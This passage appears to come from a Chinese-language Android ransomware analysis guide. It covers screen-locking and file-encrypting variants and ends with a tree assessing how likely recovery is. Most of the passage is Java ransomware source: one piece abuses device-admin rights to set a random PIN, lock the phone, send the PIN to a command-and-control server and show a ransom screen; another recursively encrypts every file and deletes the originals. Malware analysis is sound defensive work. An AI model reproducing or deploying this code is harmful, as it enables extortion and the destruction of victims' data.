### 7.2 屏幕锁定型勒索软件分析

// Android 屏幕锁定型勒索软件核心逻辑

// 1. 获取设备管理器权限（防卸载）
public class DeviceAdminReceiver extends DeviceAdminReceiver {
    @Override
    public void onEnabled(Context context, Intent intent) {
        // 获取设备管理器权限后，锁定屏幕
        DevicePolicyManager dpm = (DevicePolicyManager)
            context.getSystemService(Context.DEVICE_POLICY_SERVICE);

        // 生成随机 PIN 码
        String randomPin = String.valueOf((int)(Math.random() * 900000 + 100000));

        // 设置 PIN 锁屏密码
        dpm.resetPassword(randomPin,
            DevicePolicyManager.RESET_PASSWORD_REQUIRE_ENTRY);

        // 立即锁屏
        dpm.lockNow();

        // 上传 PIN 码到 C&C（供解密时使用）
        uploadToC2("lock_pin=" + randomPin);

        // 显示勒索界面
        Intent lockIntent = new Intent(context, RansomActivity.class);
        lockIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(lockIntent);
    }
}

### 7.3 文件加密型分析

```java
// Android 文件加密型勒索软件

public class FileEncryptor {
    private static final String ALGORITHM = "AES";
    private static final String TRANSFORMATION = "AES/CBC/PKCS5Padding";
    private static final byte[] KEY = "1234567890abcdef".getBytes(); // 硬编码密钥
    private static final byte[] IV = "abcdef1234567890".getBytes();

    public void encryptAllFiles(String rootPath) {
        File rootDir = new File(rootPath);
        encryptDirectory(rootDir);
    }

    private void encryptDirectory(File dir) {
        File[] files = dir.listFiles();
        if (files == null) return;

        for (File file : files) {
            if (file.isDirectory()) {
                encryptDirectory(file); // 递归
            } else {
                encryptFile(file);
            }
        }
    }

    private void encryptFile(File file) {
        try {
            // 读取原始文件
            byte[] fileData = readFile(file);

            // 加密
            Cipher cipher = Cipher.getInstance(TRANSFORMATION);
            SecretKeySpec keySpec = new SecretKeySpec(KEY, ALGORITHM);
            IvParameterSpec ivSpec = new IvParameterSpec(IV);
            cipher.init(Cipher.ENCRYPT_MODE, keySpec, ivSpec);
            byte[] encryptedData = cipher.doFinal(fileData);

            // 写入加密文件（添加 .locked 后缀）
            File encryptedFile = new File(file.getAbsolutePath() + ".locked");
            writeFile(encryptedFile, encryptedData);

            // 删除原始文件
            file.delete();

        } catch (Exception e) {
            // 忽略无法加密的文件
        }
    }
}
```

### 7.4 解密可能性分析

```
Android 勒索软件解密评估：

屏幕锁定型：
├── 设备管理器型：
│   ├── 安全模式下卸载设备管理器 → 可解锁
│   ├── adb 方式重置（如果 USB 调试开启）
│   ├── 工厂重置（数据丢失但可恢复设备）
│   └── 解密成功率：高（80%+）
├── 漏洞利用型（禁止安全模式）：
│   ├── 需要利用漏洞或刷机
│   └── 解密成功率：中（40-60%）
└── MDM 锁定型：
    ├── 需联系设备管理员或利用绕过技术
    └── 解密成功率：中低

文件加密型：
├── 密钥硬编码在 APK 中：
│   ├── 反编译 APK 获取密钥 → 可解密
│   └── 解密成功率：高
├── 密钥从 C&C 获取（实时下发）：
│   ├── 需要 C&C 服务器记录密钥
│   ├── 部分勒索软件有通用解密器
│   └── 解密成功率：中低
├── AES + 服务端 RSA：
│   ├── 每个文件用不同 AES 密钥
│   ├── AES 密钥用 RSA 公钥加密上传
│   └── 解密成功率：极低（除非获取私钥）
└── 弱加密实现：
    ├── ECB 模式（已知明文攻击）
    ├── 固定 IV（重放攻击）
    ├── 短密钥（暴力破解）
    └── 解密成功率：中等
```
